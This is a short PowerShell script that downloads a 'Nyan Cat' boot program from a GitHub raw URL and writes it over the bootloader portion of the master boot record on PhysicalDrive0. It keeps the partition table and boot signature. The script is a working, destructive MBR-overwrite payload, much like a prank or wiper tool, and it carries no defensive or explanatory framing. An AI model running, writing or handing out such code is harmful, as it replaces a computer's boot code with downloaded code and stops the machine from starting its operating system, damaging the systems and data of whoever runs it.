# Context: MBR is 512 bytes long. First 446 is the bootloader, next 64 is the partiton table, and the final 2 are a boot signature. We want to overwrite the bootloader but leave the other 2 alone

[Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls, Ssl3"

# Download nyan.mbr
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing

# Read in raw bytes of file (nyan cat is only 444 bytes)
$bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")

# Create a 446-byte bootcode array
$bootCode446 = New-Object byte[] 446
[Array]::Copy($bootBytes, 0, $bootCode446, 0, $bootBytes.Length)  # copy in the nyan bootcode, pads 443-445 with 0x00


# Read existing MBR
$fs = New-Object System.IO.FileStream("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
$sector = New-Object byte[] 512
$fs.Read($sector,0,512) | Out-Null

# Replace bootcode of the MBR with nyan cat
[Array]::Copy($bootCode446, 0, $sector, 0, 446)

# Write back modified bootcode
$fs.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Write($sector,0,512)
$fs.Flush()
$fs.Close()
